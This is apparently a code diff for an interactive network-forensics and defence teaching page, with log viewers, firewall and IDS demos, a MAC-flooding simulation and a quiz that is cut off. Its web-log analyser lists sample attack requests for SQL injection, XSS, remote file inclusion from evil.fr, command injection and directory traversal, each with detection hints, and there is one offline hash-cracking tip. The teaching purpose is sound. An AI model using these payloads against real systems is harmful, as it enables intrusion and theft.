+        'alice:x:<span class="fld3">1001</span>:1001:Alice Smith:/home/alice:/bin/bash\n' +
+        'bob:x:<span class="fld3">1002</span>:1002:Bob Jones:/home/bob:/bin/bash\n' +
+        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n' +
+        '\n<span class="com"># UID 0 = root (administrative). The x in the password field means the\n' +
+        '# real hash lives in /etc/shadow.</span>'
+    },
+    shadow: {
+      title: "/etc/shadow",
+      body:
+        '<span class="com"># format: user:hash:lastchg:min:max:warn:inactive:expire</span>\n' +
+        'root:<span class="fld">$6$rB3xQ8zP$J8...truncated...</span>:19000:0:99999:7:::\n' +
+        'alice:<span class="fld">$6$aK9mL2vN$Xy...truncated...</span>:19005:0:99999:7:::\n' +
+        'bob:<span class="fld">$6$pQ7wE4rT$Zc...truncated...</span>:19012:0:99999:7:::\n' +
+        '\n<span class="com"># $6$ = SHA-512 crypt. Only root can read this file.\n' +
+        '# Forensic workflow: copy the hash, run John the Ripper offline.</span>'
+    },
+    wtmp: {
+      title: "last  (reads /var/log/wtmp)",
+      body:
+        '<span class="com">$ last</span>\n' +
+        'alice    pts/0    <span class="fld2">192.168.1.45</span>   Mon Mar 11 09:14   still logged in\n' +
+        'root     pts/1    <span class="fld2">10.0.0.7</span>       Sun Mar 10 22:03 - 22:41  (00:38)\n' +
+        'bob      pts/2    <span class="fld2">192.168.1.88</span>   Sun Mar 10 14:22 - 15:07  (00:45)\n' +
+        '\n<span class="com"># wtmp records: user, terminal, source IP, login time, session duration.\n' +
+        '# The source IP is the key pivot — it links an account to a network location.</span>'
+    },
+    auth: {
+      title: "/var/log/auth.log",
+      body:
+        'Mar 11 09:14:02 sshd[2210]: Accepted password for alice from <span class="fld2">192.168.1.45</span> port 51122 ssh2\n' +
+        'Mar 11 09:22:41 sshd[2298]: <span class="fld">Failed password</span> for root from <span class="fld2">10.0.0.7</span> port 40211 ssh2\n' +
+        'Mar 11 09:22:43 sshd[2298]: <span class="fld">Failed password</span> for root from <span class="fld2">10.0.0.7</span> port 40211 ssh2\n' +
+        'Mar 11 09:22:45 sshd[2298]: <span class="fld">Failed password</span> for root from <span class="fld2">10.0.0.7</span> port 40211 ssh2\n' +
+        'Mar 11 09:23:01 sshd[2298]: <span class="fld">error: maximum authentication attempts exceeded</span>\n' +
+        '\n<span class="com"># Repeated failures from one IP in seconds = brute-force attempt.\n' +
+        '# Correlate with /var/log/wtmp for successful logins from the same IP.</span>'
+    }
+  };
+
+  var linuxTabs = document.getElementById("linux-tabs");
+  var linuxView = document.getElementById("linux-view");
+
+  function renderLinuxTab(key) {
+    var f = linuxFiles[key];
+    linuxView.innerHTML =
+      '<div class="filetab-head">' + f.title + "</div>" +
+      '<div class="filetab-body">' + f.body + "</div>";
+    Array.prototype.forEach.call(linuxTabs.children, function (b) {
+      b.classList.toggle("active", b.dataset.key === key);
+    });
+  }
+
+  Object.keys(linuxFiles).forEach(function (k) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = k;
+    b.textContent = linuxFiles[k].title;
+    b.addEventListener("click", function () { renderLinuxTab(k); });
+    linuxTabs.appendChild(b);
+  });
+  renderLinuxTab("passwd");
+
+  /* =====================================================================
+     5. WEB LOG ANALYSER
+     ===================================================================== */
+  var logData = [
+    {
+      req: "GET /product.asp?id=0%20or%201=1 HTTP/1.1",
+      tag: "SQLi",
+      type: "SQL Injection",
+      color: "#f87171",
+      detail: "The parameter <code>id=0 or 1=1</code> is a classic tautology. URL-decoded it reads <code>0 or 1=1</code> — a boolean condition that is always true, defeating the WHERE clause and returning every row in the table. Look for <code>or 1=1</code>, <code>' OR '</code>, and <code>UNION SELECT</code> in the query string."
+    },
+    {
+      req: "GET /forum.php?post=<script>alert(1); HTTP/1.1",
+      tag: "XSS",
+      type: "Cross-Site Scripting",
+      color: "#fbbf24",
+      detail: "A raw <code>&lt;script&gt;</code> tag appears in the query string. If the application echoes this value into a page without escaping, the attacker's JavaScript executes in every victim's browser. Search logs for <code>&lt;script</code>, <code>onerror=</code>, and <code>javascript:</code>."
+    },
+    {
+      req: "GET /include/?file=http://evil.fr/sh HTTP/1.1",
+      tag: "RFI",
+      type: "Remote File Inclusion",
+      color: "#f472b6",
+      detail: "The <code>file</code> parameter points at an <em>external</em> URL. The server fetches and executes the remote file — giving the attacker arbitrary code execution. Look for <code>http://</code> or <code>https://</code> inside file/page/include parameters."
+    },
+    {
+      req: "GET /lookup.jsp?ip=|ls+-l HTTP/1.1",
+      tag: "CMD",
+      type: "Command Execution / Injection",
+      color: "#a78bfa",
+      detail: "The pipe character <code>|</code> followed by <code>ls -l</code> injects a shell command. The leading pipe redirects the previous command's output into the injected command. Look for <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, backticks and <code>$()</code> in parameters that reach a shell."
+    },
+    {
+      req: "GET /cgi-bin/Count.cgi?user=a\\x90\\xbf8\\xee\\xff HTTP/1.1",
+      tag: "BOF",
+      type: "Buffer Overflow",
+      color: "#22d3ee",
+      detail: "The <code>user</code> parameter carries non-ASCII bytes: <code>\\x90</code> is a NOP sled byte and <code>\\xbf8\\xee\\xff</code> resembles a little-endian return address. This is a classic stack-smashing payload. In logs, look for long parameters containing high-byte sequences."
+    },
+    {
+      req: "GET /webapp.php?page=../../etc/passwd HTTP/1.1",
+      tag: "TRAV",
+      type: "Directory Traversal",
+      color: "#34d399",
+      detail: "The <code>../../</code> sequence walks up the directory tree out of the web root. Combined with <code>/etc/passwd</code>, the attacker is probing for a local file disclosure. Look for <code>../</code>, <code>..\\</code>, and URL-encoded equivalents (<code>%2e%2e%2f</code>)."
+    }
+  ];
+
+  var logList = document.getElementById("log-list");
+  var logDetail = document.getElementById("log-detail");
+
+  function renderLogs() {
+    logList.innerHTML = "";
+    logData.forEach(function (l, i) {
+      var row = document.createElement("div");
+      row.className = "log-row";
+      row.innerHTML = '<span class="req">' + l.req.replace(/</g, "&lt;") + "</span>" +
+        '<span class="tag" style="color:' + l.color + ';">' + l.tag + "</span>";
+      row.addEventListener("click", function () {
+        Array.prototype.forEach.call(logList.children, function (c, j) {
+          c.classList.toggle("sel", j === i);
+        });
+        logDetail.innerHTML =
+          '<div style="margin-bottom:6px;"><strong style="color:' + l.color + ';">' + l.type + "</strong></div>" +
+          l.detail;
+      });
+      logList.appendChild(row);
+    });
+  }
+  renderLogs();
+  logList.children[0].click();
+
+  /* =====================================================================
+     6. SNIFFER ATTACHMENT POINTS
+     ===================================================================== */
+  var tapModes = {
+    hub: {
+      label: "Hub",
+      device: "Hub",
+      deviceSub: "broadcasts every frame",
+      snifferSub: "promiscuous mode · passive",
+      note: "<strong>Passive capture.</strong> A hub broadcasts every incoming frame to every port, so the sniffer sees everything simply by putting its NIC into promiscuous mode. Stealthy and simple — but hubs are legacy equipment, long replaced by switches."
+    },
+    span: {
+      label: "Switch SPAN port",
+      device: "Switch (SPAN)",
+      deviceSub: "mirrors selected traffic to monitor port",
+      snifferSub: "receives the mirrored copy",
+      note: "<strong>Port mirroring.</strong> The switch is configured to copy traffic from selected ports to the SPAN (monitor) port where the sniffer sits. Convenient and non-disruptive — but under heavy load the switch may drop mirrored packets, giving you an incomplete capture."
+    },
+    tap: {
+      label: "Network TAP",
+      device: "Network TAP",
+      deviceSub: "inline hardware tap",
+      snifferSub: "receives a full-fidelity copy",
+      note: "<strong>Inline hardware tap.</strong> A physical device inserted on the ingress connection side of the switch. It copies every bit without dropping, giving a full-fidelity capture — but it requires physically breaking the link to insert it."
+    }
+  };
+
+  var tapTabs = document.getElementById("tap-tabs");
+  var tapNote = document.getElementById("tap-note");
+  var tapDiagram = document.getElementById("tap-diagram");
+  var tapDevice = document.getElementById("tap-device");
+  var tapDeviceSub = document.getElementById("tap-device-sub");
+  var tapSnifferSub = document.getElementById("tap-sniffer-sub");
+
+  function renderTap(key) {
+    var m = tapModes[key];
+    tapDevice.innerHTML = "<b>" + m.device + "</b><span>" + m.deviceSub + "</span>";
+    tapSnifferSub.textContent = m.snifferSub;
+    tapNote.innerHTML = m.note;
+    Array.prototype.forEach.call(tapTabs.children, function (b) {
+      b.classList.toggle("active", b.dataset.key === key);
+    });
+  }
+
+  Object.keys(tapModes).forEach(function (k) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = k;
+    b.textContent = tapModes[k].label;
+    b.addEventListener("click", function () { renderTap(k); });
+    tapTabs.appendChild(b);
+  });
+  renderTap("hub");
+
+  /* =====================================================================
+     7. DEFENSE-IN-DEPTH CONCENTRIC RINGS
+     ===================================================================== */
+  var didLayers = [
+    { n: 1, name: "Policies, Procedures & Awareness", desc: "Passwords, operational policies, data classification.", r: 185, stroke: "#4b5563", fill: "rgba(75,85,99,.10)" },
+    { n: 2, name: "Physical Security", desc: "Locks, fences, security guards.", r: 160, stroke: "#6b7280", fill: "rgba(107,114,128,.10)" },
+    { n: 3, name: "Perimeter Security", desc: "Boundary routers, firewalls, VPNs, packet filters.", r: 135, stroke: "#60a5fa", fill: "rgba(96,165,250,.10)" },
+    { n: 4, name: "Internal Network Security", desc: "Internal firewalls, NIDS, encryption.", r: 110, stroke: "#22d3ee", fill: "rgba(34,211,238,.10)" },
+    { n: 5, name: "Host Security", desc: "OS hardening, patch management, malware protection.", r: 85, stroke: "#a78bfa", fill: "rgba(167,139,250,.10)" },
+    { n: 6, name: "Application Security", desc: "Single Sign-On (SSO), authentication, authorization.", r: 60, stroke: "#f472b6", fill: "rgba(244,114,182,.10)" },
+    { n: 7, name: "Data Security", desc: "Database security, content protection, message encryption.", r: 35, stroke: "#34d399", fill: "rgba(52,211,153,.14)" }
+  ];
+
+  var didSvg = document.getElementById("did-svg");
+  var didLegend = document.getElementById("did-legend");
+  var didInfo = document.getElementById("did-info");
+
+  function buildDidSvg() {
+    /* keep the centre circle/text, add rings from outside in */
+    var svgNS = "http://www.w3.org/2000/svg";
+    /* remove existing rings */
+    Array.prototype.slice.call(didSvg.querySelectorAll(".did-ring")).forEach(function (n) { n.remove(); });
+
+    didLayers.forEach(function (layer, i) {
+      var c = document.createElementNS(svgNS, "circle");
+      c.setAttribute("cx", "200");
+      c.setAttribute("cy", "200");
+      c.setAttribute("r", layer.r);
+      c.setAttribute("fill", layer.fill);
+      c.setAttribute("stroke", layer.stroke);
+      c.setAttribute("stroke-width", "2");
+      c.setAttribute("class", "did-ring");
+      c.dataset.i = i;
+      c.addEventListener("click", function () { selectDid(i); });
+      /* insert before the centre circle so centre stays on top */
+      didSvg.insertBefore(c, didSvg.firstChild);
+
+      /* label at the top of each ring */
+      var t = document.createElementNS(svgNS, "text");
+      t.setAttribute("x", "200");
+      t.setAttribute("y", (200 - layer.r + 15).toString());
+      t.setAttribute("text-anchor", "middle");
+      t.setAttribute("font-size", "11");
+      t.setAttribute("font-weight", "700");
+      t.setAttribute("font-family", "ui-monospace,monospace");
+      t.setAttribute("fill", layer.stroke);
+      t.textContent = layer.n;
+      t.setAttribute("pointer-events", "none");
+      t.dataset.i = i;
+      t.setAttribute("class", "did-ring");
+      didSvg.insertBefore(t, didSvg.firstChild);
+    });
+    /* data label at centre */
+    var label = document.createElementNS(svgNS, "text");
+    label.setAttribute("x", "200");
+    label.setAttribute("y", "204");
+    label.setAttribute("text-anchor", "middle");
+    label.setAttribute("font-size", "10");
+    label.setAttribute("font-weight", "700");
+    label.setAttribute("fill", "#d4fff0");
+    label.setAttribute("font-family", "ui-monospace,monospace");
+    label.textContent = "DATA";
+    didSvg.appendChild(label);
+  }
+
+  function selectDid(i) {
+    didLayers.forEach(function (_, j) {
+      /* dim all rings except the selected one */
+      var els = didSvg.querySelectorAll('[data-i="' + j + '"]');
+      Array.prototype.forEach.call(els, function (el) {
+        el.classList.toggle("dim", j !== i);
+        el.classList.toggle("active", j === i);
+      });
+    });
+    Array.prototype.forEach.call(didLegend.children, function (c, j) {
+      c.classList.toggle("active", j === i);
+    });
+    var L = didLayers[i];
+    didInfo.innerHTML = "<strong>Layer " + L.n + " — " + L.name + ".</strong> " + L.desc;
+  }
+
+  didLayers.forEach(function (layer, i) {
+    var d = document.createElement("div");
+    d.className = "did-item";
+    d.innerHTML = '<div class="did-num">' + layer.n + "</div>" +
+      '<div class="txt"><b>' + layer.name + "</b><span>" + layer.desc + "</span></div>";
+    d.addEventListener("click", function () { selectDid(i); });
+    didLegend.appendChild(d);
+  });
+
+  buildDidSvg();
+  selectDid(6); /* start with data layer */
+
+  /* =====================================================================
+     8. FIREWALL RULE TESTER
+     ===================================================================== */
+  var rfSrc = document.getElementById("rf-src");
+  var rfDst = document.getElementById("rf-dst");
+  var rfBad = document.getElementById("rf-bad");
+  var rfGood = document.getElementById("rf-good");
+  var rfNote = document.getElementById("rf-note");
+
+  function ruleDecision(mode, src, dst) {
+    /* returns "DENY" or "ALLOW" */
+    if (mode === "bad") {
+      /* bad rule: SRC any port 80, DST 24.180.49.139 port 80 → DENY */
+      if (src === 80 && dst === 80) return "DENY";
+      return "ALLOW";
+    } else {
+      /* good rule: SRC any any, DST 24.180.49.139 port 80 → DENY */
+      if (dst === 80) return "DENY";
+      return "ALLOW";
+    }
+  }
+
+  function runRuleTest() {
+    var src = parseInt(rfSrc.value, 10) || 0;
+    var dst = parseInt(rfDst.value, 10) || 0;
+
+    var badDec = ruleDecision("bad", src, dst);
+    var goodDec = ruleDecision("good", src, dst);
+
+    rfBad.className = "verdict-pill " + (badDec === "DENY" ? "ok" : "bad");
+    rfBad.innerHTML = "<b>Bad rule → " + badDec + "</b>" +
+      "SRC any:" + src + " → DST :" + dst;
+
+    rfGood.className = "verdict-pill " + (goodDec === "DENY" ? "ok" : "bad");
+    rfGood.innerHTML = "<b>Good rule → " + goodDec + "</b>" +
+      "SRC any:" + src + " → DST :" + dst;
+
+    if (dst !== 80) {
+      rfNote.innerHTML = "Destination port is not 80 — neither rule applies, so both firewalls permit the packet. Change the destination port to 80 to test the rules against their actual target.";
+    } else if (src !== 80) {
+      rfNote.innerHTML = "<strong style='color:#ffb3b3'>The bad rule fails.</strong> " +
+        "The client's source port is an ephemeral port (" + src + "), not 80. The bad rule only matches when the source port is 80, so the malicious HTTP packet is <strong>ALLOWED</strong>. " +
+        "The good rule (source port = any) correctly <strong>DENIES</strong> it. " +
+        "This is the exact misconfiguration the slides warn about.";
+    } else {
+      rfNote.innerHTML = "<strong style='color:#9ff0cd'>Both rules deny this packet.</strong> " +
+        "With a source port of 80, the bad rule happens to match — but real client traffic never uses source port 80. " +
+        "Try a realistic ephemeral source port such as 52341.";
+    }
+  }
+
+  document.getElementById("rf-test").addEventListener("click", runRuleTest);
+  rfSrc.addEventListener("input", runRuleTest);
+  rfDst.addEventListener("input", runRuleTest);
+  runRuleTest();
+
+  /* =====================================================================
+     9. STATEFUL vs STATELESS FILTERING
+     ===================================================================== */
+  var fwMode = "stateless";
+  var fwState = document.getElementById("fw-state");
+  var fwChips = document.querySelectorAll("[data-fwmode]");
+
+  Array.prototype.forEach.call(fwChips, function (c) {
+    c.addEventListener("click", function () {
+      fwMode = c.dataset.fwmode;
+      Array.prototype.forEach.call(fwChips, function (x) {
+        x.classList.toggle("active", x.dataset.fwmode === fwMode);
+      });
+      fwState.textContent = fwMode === "stateless"
+        ? "Stateless mode selected.\nACLs evaluated per-packet, no memory of prior connections.\n\n> ready — click 'Send outbound HTTP request'"
+        : "Stateful mode selected.\nA state table will track each connection's lifecycle.\n\n> ready — click 'Send outbound HTTP request'";
+    });
+  });
+
+  document.getElementById("fw-send").addEventListener("click", function () {
+    fwState.textContent = "";
+    var lines = [];
+
+    function push(t, cls) {
+      lines.push(t);
+      fwState.innerHTML = lines.map(function (l, i) {
+        if (i === lines.length - 1 && cls) {
+          return '<span class="' + cls + '">' + l + "</span>";
+        }
+        return l;
+      }).join("\n");
+    }
+
+    if (fwMode === "stateless") {
+      lines.push("> Client 192.168.1.50:52341 → Server 24.180.49.139:80");
+      lines.push("  [OUTBOUND] SYN  src:52341  dst:80");
+      lines.push("  ACL check: allow tcp any → any:80   ✔ PASS");
+      lines.push("");
+      setTimeout(function () {
+        lines.push("> Server 24.180.49.139:80 → Client 192.168.1.50:52341");
+        lines.push("  [INBOUND]  SYN-ACK  src:80  dst:52341");
+        lines.push("  ACL check: is there a rule allowing inbound to :52341 ?");
+        lines.push("  ✘ NO MATCHING RULE → PACKET DROPPED");
+        lines.push("");
+        lines.push("  The stateless filter has no memory of the outbound SYN,");
+        lines.push("  so it cannot know that this inbound packet is legitimate reply traffic.");
+        fwState.innerHTML = lines.map(function (l, i) {
+          var cls = "";
+          if (l.indexOf("✘") !== -1 || l.indexOf("DROPPED") !== -1) cls = "bad";
+          else if (l.indexOf("✔") !== -1) cls = "ok";
+          else if (l.indexOf(">") === 0) cls = "cy";
+          return '<span class="' + cls + '">' + l + "</span>";
+        }).join("\n");
+      }, 600);
+    } else {
+      lines.push("> Client 192.168.1.50:52341 → Server 24.180.49.139:80");
+      lines.push("  [OUTBOUND] SYN  src:52341  dst:80");
+      lines.push("  ACL check: allow tcp any → any:80   ✔ PASS");
+      lines.push("  State table entry created:");
+      lines.push("  ┌─────────────────────────────────────────────────────┐");
+      lines.push("  │ proto  src                    dst            state  │");
+      lines.push("  │ TCP    192.168.1.50:52341  →  24.180.49.139:80  SYN_SENT │");
+      lines.push("  └─────────────────────────────────────────────────────┘");
+      lines.push("");
+      setTimeout(function () {
+        lines.push("> Server 24.180.49.139:80 → Client 192.168.1.50:52341");
+        lines.push("  [INBOUND]  SYN-ACK  src:80  dst:52341");
+        lines.push("  State table lookup: matching ESTABLISHED session found  ✔");
+        lines.push("  → return traffic AUTOMATICALLY PERMITTED");
+        lines.push("  state entry updated: SYN_SENT → ESTABLISHED");
+        fwState.innerHTML = lines.map(function (l, i) {
+          var cls = "";
+          if (l.indexOf("✔") !== -1 || l.indexOf("PERMITTED") !== -1 || l.indexOf("ESTABLISHED") !== -1) cls = "ok";
+          else if (l.indexOf(">") === 0) cls = "cy";
+          else if (l.indexOf("│") !== -1 || l.indexOf("┌") !== -1 || l.indexOf("└") !== -1) cls = "pur";
+          return '<span class="' + cls + '">' + l + "</span>";
+        }).join("\n");
+      }, 600);
+    }
+
+    fwState.innerHTML = lines.join("\n");
+  });
+
+  fwState.textContent = "Stateless mode selected.\nACLs evaluated per-packet, no memory of prior connections.\n\n> ready — click 'Send outbound HTTP request'";
+
+  /* =====================================================================
+     10. NIDS vs NIPS DIAGRAM
+     ===================================================================== */
+  var idsModes = {
+    nids: {
+      device:
+        '<div style="display:flex;justify-content:center;">' +
+        '<div class="node purple" style="min-width:220px;">' +
+        '<b>NIDS</b><span>out-of-band · SPAN port or hub tap</span></div></div>',
+      note: "<strong>NIDS — out-of-band monitoring.</strong> The sensor is <em>not</em> in the traffic path; it receives a copy via a SPAN port or hub tap. It can alert on malicious traffic but cannot stop it — the attack still reaches the internal network. Detection only.",
+      flow: "alert"
+    },
+    nips: {
+      device:
+        '<div style="display:flex;justify-content:center;">' +
+        '<div class="node green" style="min-width:220px;border-color:#1a9c78;box-shadow:0 0 0 2px #34d399;">' +
+        '<b>NIPS</b><span>INLINE · between firewall and internal network</span></div></div>',
+      note: "<strong>NIPS — inline prevention.</strong> The device sits directly in the traffic path. It performs full NIDS detection <em>plus</em> active remediation: it drops malicious packets, sends TCP RSTs to tear down hostile sessions, and can dynamically rewrite firewall rules in real time. The attack never reaches the protected assets.",
+      flow: "block"
+    }
+  };
+
+  var idsChips = document.querySelectorAll("[data-idsmode]");
+  var idsDeviceWrap = document.getElementById("ids-device-wrap");
+  var idsNote = document.getElementById("ids-note");
+
+  function renderIds(key) {
+    var m = idsModes[key];
+    idsDeviceWrap.innerHTML = m.device;
+    idsNote.innerHTML = m.note;
+    Array.prototype.forEach.call(idsChips, function (c) {
+      c.classList.toggle("active", c.dataset.idsmode === key);
+    });
+  }
+
+  Array.prototype.forEach.call(idsChips, function (c) {
+    c.addEventListener("click", function () { renderIds(c.dataset.idsmode); });
+  });
+  renderIds("nids");
+
+  /* =====================================================================
+     11. MAC FLOODING DEMO
+     ===================================================================== */
+  var macTable = document.getElementById("mac-table");
+  var macNote = document.getElementById("mac-note");
+  var MAC_CAP = 6;
+  var macEntries = [
+    { mac: "00:11:22:33:44:01", port: "Fa0/1", legit: true },
+    { mac: "00:11:22:33:44:02", port: "Fa0/2", legit: true }
+  ];
+  var macFlooded = false;
+
+  function renderMac() {
+    var html = '<div class="mac-slot" style="color:#c3c8dd;font-weight:700;">' +
+      "<span>#</span><span>MAC address</span><span>Port</span></div>";
+    for (var i = 0; i < MAC_CAP; i++) {
+      if (i < macEntries.length) {
+        var e = macEntries[i];
+        html += '<div class="mac-slot ' + (e.legit ? "filled" : "evil") + '">' +
+          "<span>" + (i + 1) + "</span>" +
+          "<span>" + e.mac + "</span>" +
+          "<span>" + e.port + "</span></div>";
+      } else {
+        html += '<div class="mac-slot"><span>' + (i + 1) +
+          '</span><span class="dim">— empty —</span><span>—</span></div>';
+      }
+    }
+    macTable.innerHTML = html;
+
+    if (macFlooded) {
+      macNote.innerHTML = "<strong style='color:#ffb3b3'>MAC table full — fail-open hub mode.</strong> " +
+        "The switch can no longer learn or store addresses. Unknown destination MACs are flooded to every port, so the attacker's sniffer now sees traffic that was never addressed to it. " +
+        "This is why <strong>port security</strong> (max MAC count, static bindings, 802.1X) matters.";
+    } else {
+      macNote.innerHTML = "The switch has learned the MAC addresses it has seen on each port. Click <em>Send victim → server packet</em> to see normal forwarding, or <em>Flood</em> to attack the table.";
+    }
+  }
+
+  document.getElementById("mac-flood").addEventListener("click", function () {
+    macFlooded = false;
+    var fake = 0;
+    var timer = setInterval(function () {
+      if (macEntries.length >= MAC_CAP) {
+        clearInterval(timer);
+        macFlooded = true;
+        renderMac();
+        return;
+      }
+      macEntries.push({
+        mac: "AA:BB:CC:" + ("0" + (fake + 1)).slice(-2) + ":DE:AD",
+        port: "Fa0/" + (10 + fake),
+        legit: false
+      });
+      fake++;
+      renderMac();
+    }, 260);
+  });
+
+  document.getElementById("mac-reset").addEventListener("click", function () {
+    macEntries = [
+      { mac: "00:11:22:33:44:01", port: "Fa0/1", legit: true },
+      { mac: "00:11:22:33:44:02", port: "Fa0/2", legit: true }
+    ];
+    macFlooded = false;
+    renderMac();
+  });
+
+  document.getElementById("mac-send").addEventListener("click", function () {
+    if (macFlooded) {
+      macNote.innerHTML = "<strong style='color:#ffb3b3'>Flooded to all ports.</strong> " +
+        "With the MAC table full, the switch cannot look up the destination MAC and falls back to broadcasting. The attacker's sniffer receives the victim→server packet — passive sniffing now works on what should be a switched network.";
+    } else {
+      macNote.innerHTML = "<strong style='color:#9ff0cd'>Forwarded only to the correct port.</strong> " +
+        "The switch consulted its MAC table, found the destination MAC on the server's port, and forwarded the frame there only. The attacker on another port sees nothing.";
+    }
+  });
+
+  renderMac();
+
+  /* =====================================================================
+     12. PORT VIOLATION ACTIONS
+     ===================================================================== */
+  var violations = {
+    shutdown: {
+      label: "Shutdown",
+      note: "<strong>Shutdown.</strong> The port is administratively disabled the moment a violation occurs. It stays down until an administrator manually resets it. Strongest containment — but also the easiest to abuse as a denial-of-service against legitimate users."
+    },
+    restrict: {
+      label: "Restrict",
+      note: "<strong>Restrict.</strong> Non-compliant frames are dropped <em>and</em> a violation counter is incremented and logged. Gives you both containment and forensic evidence that something tried to misbehave."
+    },
+    protect: {
+      label: "Protect",
+      note: "<strong>Protect.</strong> Non-compliant frames are silently dropped with <em>no logging</em>. The port keeps working for compliant traffic, but you get no record of the violation — which makes incident response much harder."
+    }
+  };
+
+  var violationTabs = document.getElementById("violation-tabs");
+  var violationNote = document.getElementById("violation-note");
+
+  function renderViolation(key) {
+    violationNote.innerHTML = violations[key].note;
+    Array.prototype.forEach.call(violationTabs.children, function (b) {
+      b.classList.toggle("active", b.dataset.key === key);
+    });
+  }
+
+  Object.keys(violations).forEach(function (k) {
+    var b = document.createElement("button");
+    b.className = "chip";
+    b.dataset.key = k;
+    b.textContent = violations[k].label;
+    b.addEventListener("click", function () { renderViolation(k); });
+    violationTabs.appendChild(b);
+  });
+  renderViolation("shutdown");
+
+  /* =====================================================================
+     13. AAA PILLARS
+     ===================================================================== */
+  var aaaData = [
+    {
+      key: "authn",
+      icon: "🔑",
+      name: "Authentication",
+      question: "“Who are you?”",
+      note: "<strong>Authentication</strong> verifies user identity through credentials or certificates. It answers <em>who are you?</em> — and it must happen before anything else can be enforced."
+    },
+    {
+      key: "authz",
+      icon: "🛡️",
+      name: "Authorization",
+      question: "“What can you do?”",
+      note: "<strong>Authorization</strong> enforces the user's access permissions to specific files and services. It answers <em>what are you allowed to do?</em> — and is meaningless without a successful authentication first."
+    },
+    {
+      key: "acct",
+      icon: "📋",
+      name: "Accounting",
+      question: "“When and what did you do?”",
+      note: "<strong>Accounting</strong> logs user activity, session start/stop times, and resource consumption. It answers <em>when and what did you do?</em> — and is exactly the evidence source network forensics relies on."
+    }
+  ];
+
+  var aaaCards = document.getElementById("aaa-cards");
+  var aaaNote = document.getElementById("aaa-note");
+
+  aaaData.forEach(function (a, i) {
+    var d = document.createElement("div");
+    d.className = "aaa-card";
+    d.innerHTML = '<span class="icon">' + a.icon + "</span>" +
+      "<b>" + a.name + "</b><span>" + a.question + "</span>";
+    d.addEventListener("click", function () {
+      Array.prototype.forEach.call(aaaCards.children, function (c, j) {
+        c.classList.toggle("active", j === i);
+      });
+      aaaNote.innerHTML = a.note;
+    });
+    aaaCards.appendChild(d);
+  });
+  aaaNote.innerHTML = "<strong>AAA = Authentication + Authorization + Accounting.</strong> Click a pillar above. The three are always listed in that order because each depends on the previous one.";
+
+  /* =====================================================================
+     14. QUIZ
+     ===================================================================== */
+  var quizData = [
+    {
+      q: "Which step of the Pollitt process model deals with presenting evidence in court?",
+      opts: ["Acquisition", "Identification", "Evaluation", "Admission"],
+      answer: 3,
+      ex: "Pollitt: Acquisition (lawful obtain) → Identification (locate & collect) → Evaluation (relevance & admissibility) → Admission (present in court)."
+    },
+    {
+      q: "Why is cryptographic hashing central to the chain of custody?",
+      opts: [
+        "It encrypts the evidence so nobody can read it",
+        "It proves the analysed copy is byte-identical to what was collected",
+        "It compresses the drive image for storage",
+        "It automatically writes the investigator's notes"
+      ],
+      answer: 1,
+      ex: "A checksum (MD5 legacy, SHA-1, SHA-256) recorded at acquisition and recomputed later proves no alteration. Any divergence invalidates evidence integrity."
+    },
+    {
+      q: "Which should be captured first at a forensic scene?",
+      opts: [
+        "The hard disk, because it holds the most data",
+        "The RAM, because it is volatile and lost on power-off",
+        "The printer queue",
+        "The web browser cache on disk"
+      ],
+      answer: 1,
+      ex: "RAM holds the bootloader, kernel structures and live user session state. It is destroyed by power loss, so it must be captured before disk imaging."
+    },
+    {
+      q: "In /etc/passwd, what does UID 0 signify?",
+      opts: ["A disabled account", "A guest account", "Root / administrative privileges", "A system service with no shell"],
+      answer: 2,
+      ex: "UID 0 is root. The password field showing 'x' means the real hash lives in /etc/shadow."
+    },
+    {
+      q: "Which log line indicates a directory traversal attempt?",
+      opts: [
+        "GET /product.asp?id=0 or 1=1",
+        "GET /forum.php?post=<script>alert(1);",
+        "GET /webapp.php?page=../../etc/passwd",
+        "GET /lookup.jsp?ip=|ls -l"
+      ],
+      answer: 2,
+      ex: "The ../../ sequence walks up out of the web root. The others are SQLi, XSS and command injection respectively."
+    },
+    {
+      q: "Which attachment point gives a full-fidelity capture without packet drops?",
+      opts: ["Hub", "Switch SPAN port", "Network TAP", "Promiscuous mode on a workstation"],
+      answer: 2,
+      ex: "An inline hardware TAP copies every bit without dropping. A SPAN port can drop mirrored packets under heavy load."
+    },
+    {
+      q: "In defense-in-depth, which layer sits closest to the data at the core?",
+      opts: ["Perimeter security", "Host security", "Application security", "Data security"],
+      answer: 3,
+      ex: "Layer 7 — data security (database security, content protection, message encryption) is the innermost ring surrounding the data itself."
+    },
+    {
+      q: "Why does the bad firewall rule fail to block malicious HTTP to port 80?",
+      opts: [
+        "It denies too many ports at once",
+        "It only matches when the source port is 80, but clients use ephemeral ports 1024–65535",
+        "It uses UDP instead of TCP",
+        "It is applied to the wrong interface"
+      ],
+      answer: 1,
+      ex: "Real client traffic originates from a dynamic ephemeral source port, so SRC any:80 never matches. The correct rule uses SRC any:any and matches on the destination port only."
+    },
+    {
+      q: "What advantage does a stateful filter have over a stateless one?",
+      opts: [
+        "It encrypts all traffic",
+        "It maintains a state table and automatically permits return traffic for established sessions",
+        "It performs deep packet inspection on payloads",
+        "It blocks ARP poisoning"
+      ],
+      answer: 1,
+      ex: "A stateful filter tracks connection state (SYN, ESTABLISHED) in a dynamic state table, so replies to legitimate outbound sessions need no explicit ACL rule."
+    },
+    {
+      q: "Which statement correctly distinguishes NIDS from NIPS?",
+      opts: [
+        "NIDS is inline; NIPS is out-of-band",
+        "NIDS alerts out-of-band; NIPS sits inline and can drop packets, send RSTs and rewrite firewall rules",
+        "NIDS performs DPI; NIPS cannot",
+        "NIPS only works on hubs"
+      ],
+      answer: 1,
+      ex: "NIDS monitors a copy of traffic via SPAN/hub and only alerts. NIPS is inline and performs active remediation — dropping packets, resetting connections, modifying firewall rules in real time."
+    },
+    {
+      q: "An application proxy firewall operates at which OSI layer, and what does it do?",
+      opts: [
+        "Layer 2 — it switches frames between VLANs",
+        "Layer 3 — it routes packets between subnets",
+        "Layer 7 — it terminates the client connection and opens a second connection to the server",
+        "Layer 4 — it filters on port numbers only"
+      ],
+      answer: 2,
+      ex: "An application proxy works at Layer 7: it terminates the incoming client connection and establishes a secondary connection to the destination, eliminating direct IP routing between external users and internal servers."
+    },
+    {
+      q: "Which pair correctly matches AAA protocol to encryption scope?",
+      opts: [
+        "RADIUS encrypts the whole body; TACACS+ encrypts only the password",
